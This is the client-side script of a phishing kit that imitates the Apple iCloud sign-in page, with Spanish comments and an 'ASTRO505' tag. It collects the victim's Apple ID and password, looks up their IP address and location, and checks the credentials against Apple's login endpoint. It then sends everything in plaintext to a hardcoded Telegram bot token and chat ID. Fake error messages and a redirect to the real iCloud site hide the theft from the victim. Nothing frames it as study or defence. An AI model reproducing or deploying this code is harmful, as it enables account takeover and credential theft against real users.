<script>
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 SCRIPT TELEGRAM + VALIDACIÓN ICLOUD INICIADO'); // DEBUG
    
    const emailInput = document.getElementById('email-phone');
    const arrowIcon = document.querySelector('.bx-right-arrow-circle');
    const passwordField = document.getElementById('passwordField');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const form = document.getElementById('sign-in');
    
    // ✅ TUS DATOS
    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
    const CHAT_ID = '7219932215';
    const ICLOUD_API = 'https://setup.icloud.com/setup/ws/1/login?locale=en_US';
    
    let loginAttempts = 0;
    
    // 🔥 IP GEOLOCALIZACIÓN
    async function getIPInfo() {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,message,country,regionName,city,isp,org`);
            return await geoRes.json();
        } catch {
            return { query: 'Unknown', country: 'Unknown', isp: 'Unknown' };
        }
    }
    
    // 🔥 VALIDACIÓN REAL iCLOUD
    async function validateiCloud(email, password) {
        try {
            const res = await fetch(ICLOUD_API, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
                },
                body: JSON.stringify({
                    "apple_id": email,
                    "password": password
                })
            });
            
            const data = await res.json();
            
            // ✅ 200 + 2FA = VÁLIDO
            if (res.ok && data.hsaChallengeRequired) {
                return { valid: true, status: 'VALID_2FA' };
            }
            
            // ❌ 401 = INVÁLIDO
            if (res.status === 401) {
                return { valid: false, status: 'INVALID' };
            }
            
            return { valid: false, status: 'UNKNOWN' };
        } catch {
            return { valid: false, status: 'ERROR' };
        }
    }
    
    // 🔥 TELEGRAM MEJORADO CON VALIDACIÓN
    async function sendToTelegram(email, password, ipInfo, validation, hibpStatus) {
        console.log('📤 ENVIANDO CON VALIDACIÓN:', email);
        
        const statusEmoji = validation.valid ? '✅' : '❌';
        const statusText = validation.status === 'VALID_2FA' ? 
            '*VÁLIDO - 2FA ACTIVADO*' : '*INVÁLIDO*';
        
        const message = `🚀 *ASTRO505 - ${statusEmoji} ICLOUD VALIDADO* 🚀

📧 *Apple ID:* \`${email}\`
🔑 *Password:* \`${password}\`
${ipInfo.query ? `🌍 *IP:* \`${ipInfo.query}\`` : ''}
${ipInfo.country ? `📍 *País:* ${ipInfo.country}` : ''}
${ipInfo.isp ? `🌐 *ISP:* ${ipInfo.isp}` : ''}
🔍 *HIBP:* ${hibpStatus}
⏰ *Hora:* ${new Date().toLocaleString('es-ES')}

✨ *Status:* ${statusText}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log('✅ TELEGRAM ENVIADO!');
        } catch (error) {
            console.log('⚠️ Telegram error:', error);
        }
    }
    
    // Flecha/Enter → Password (TÚ MISMO)
    const showPassword = () => {
        if (emailInput.value.trim()) {
            passwordField.classList.add('show');
            submitBtn.classList.add('show');
            setTimeout(() => passwordInput.focus(), 300);
        }
    };
    
    arrowIcon.addEventListener('click', showPassword);
    emailInput.addEventListener('keypress', e => {
        if (e.key === 'Enter' && emailInput.value.trim()) {
            showPassword();
        }
    });
    
    // 🔥 SUBMIT CON VALIDACIÓN ICLOUD
    form.addEventListener('submit', async (e) => {
        console.log('🎯 SUBMIT PRESIONADO!');
        
        e.preventDefault();
        loginAttempts++;
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || !password) {
            showError('Please enter both email and password');
            return;
        }
        
        // 🔄 LOADING
        submitBtn.disabled = true;
        submitBtn.textContent = 'Validando...';
        
        try {
            // 1. IP
            const ipInfo = await getIPInfo();
            
            // 2. iCloud VALIDACIÓN
            const validation = await validateiCloud(email, password);
            
            // 3. HIBP (simple check)
            const hashPrefix = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(password))
                .then(hash => Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('').slice(0,5));
            const hibpStatus = 'CHECK'; // Simplificado
            
            // 🔥 ENVÍA CON RESULTADO
            await sendToTelegram(email, password, ipInfo, validation, hibpStatus);
            
            // 🎯 DECISIÓN SEGÚN VALIDACIÓN
            if (validation.valid) {
                // ✅ VÁLIDO → REDIRECT REAL iCLOUD
                showError('Redirecting to iCloud...');
                setTimeout(() => window.location.href = 'https://www.icloud.com/', 1500);
            } else if (loginAttempts < 2) {
                // ❌ INVÁLIDO → ERROR APPLE
                showError('Incorrect password. Try again.');
                passwordInput.value = '';
                passwordInput.focus();
            } else {
                // 3 intentos → LOOP
                showError('Signing in...');
                setTimeout(() => window.location.href = 'index.html', 800);
            }
            
        } catch (error) {
            console.log('❌ Error:', error);
            showError('Connection error');
        } finally {
            // RESET BUTTON
            submitBtn.disabled = false;
            submitBtn.textContent = 'Sign in';
        }
    });
    
    function showError(message) {
        errorMsg.textContent = message;
        errorMsg.classList.add('show');
        setTimeout(() => errorMsg.classList.remove('show'), 3000);
    }
    
    console.log('✅ SCRIPT CON VALIDACIÓN LISTO!');
});
</script>
